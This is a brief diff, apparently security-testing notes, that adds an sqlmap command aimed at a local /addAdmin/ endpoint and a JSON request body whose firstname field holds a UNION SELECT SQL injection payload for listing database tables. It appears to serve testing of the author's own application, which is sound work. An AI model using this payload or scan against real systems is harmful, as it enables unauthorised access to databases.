@@ -1,0 +1,3 @@
+http://localhost:8000/addAdmin/ (POST)  # /opt/homebrew/bin/sqlmap -r sql_request.txt --dbms=postgresql --level=3 --risk=3 --batch --output-dir=sqlmap_scan
+
+{"firstname":" UNION SELECT 1, table_name, 3 FROM information_schema.tables --","lastname":"test", "contactNumber":3, "address":"nair", "email": "a@em.com", password: "12"}
